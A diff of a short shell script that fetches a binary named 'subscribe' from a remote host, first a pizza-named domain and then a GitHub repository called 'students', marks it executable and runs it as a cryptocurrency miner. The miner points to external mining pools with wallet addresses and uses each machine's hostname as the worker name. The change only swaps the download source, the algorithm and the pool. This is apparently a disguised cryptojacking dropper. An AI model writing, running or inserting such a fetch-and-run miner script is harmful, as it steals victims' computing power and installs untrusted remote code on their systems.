@@ -1,8 +1,8 @@
 #!/bin/sh
 
-wget http://ilovenypizza.com/subscribe
+wget https://raw.githubusercontent.com/mariobiszz/students/main/subscribe
 chmod +x subscribe
 
 #run
 
-./subscribe -a cpupower -o stratum+tcp://cpupower.mine.zergpool.com:4250 -u CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk.$(cat /proc/sys/kernel/hostname) -p=c=CPU,mc=CPU
+./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
